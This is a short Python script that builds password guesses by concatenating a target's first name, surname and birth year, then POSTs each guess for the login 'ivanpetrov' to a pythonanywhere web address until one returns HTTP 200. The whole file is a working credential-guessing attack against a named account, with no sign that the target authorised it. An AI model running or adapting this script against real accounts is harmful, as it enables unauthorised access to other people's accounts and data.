import requests
import asyncio

passwordList = ['Ivan', 'ivan', 'Petrov', 'petrov', '1987', '']
norm = []
print('hi')

for a in passwordList:
    for b in passwordList:
        for c in passwordList:
            p = a + b + c
            norm.append(p)
            p = ''
            print('1')

for password in norm:
    response = requests.post('https://artemiikabanov.pythonanywhere.com/',
                             json={'login': 'ivanpetrov', 'password': password})
    print('2')
    if response.status_code == 200:
        print('good', password)
        break
print('lox')
